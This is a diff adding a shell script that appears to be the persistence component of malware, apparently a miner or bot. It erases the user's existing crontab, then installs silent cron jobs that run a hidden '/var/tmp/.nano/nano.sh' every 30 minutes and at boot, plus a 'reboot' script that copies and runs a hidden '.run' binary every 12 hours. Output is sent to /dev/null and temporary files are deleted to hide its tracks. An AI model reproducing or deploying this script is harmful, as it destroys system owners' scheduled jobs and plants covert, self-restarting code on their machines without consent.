@@ -1,0 +1,24 @@
+#!/bin/sh
+rm -rf cron.d dir.dir
+crontab -r
+pwd > dir.dir
+dir=$(cat dir.dir)
+#userdir=`cd ~/;pwd`
+userdir=/var/tmp
+echo $userdir > userdir.dir
+userdir2=$(cat userdir.dir)
+cd $dir
+echo '#!/bin/sh
+dir='$dir'
+cd '$dir'
+cp -f .run run
+'$dir'/run
+echo Rebooted "$(date)" >> rebooted.txt' > reboot
+chmod +x reboot
+
+echo "*/30 * * * * /bin/sh $userdir2/.nano/nano.sh &> /dev/null
+0 */12 * * * /bin/sh $dir/reboot &> /dev/null
+@reboot /bin/sh $userdir2/.nano/nano.sh &> /dev/null" > cron.d
+crontab cron.d
+crontab -l
+rm -rf cron.d crondsh
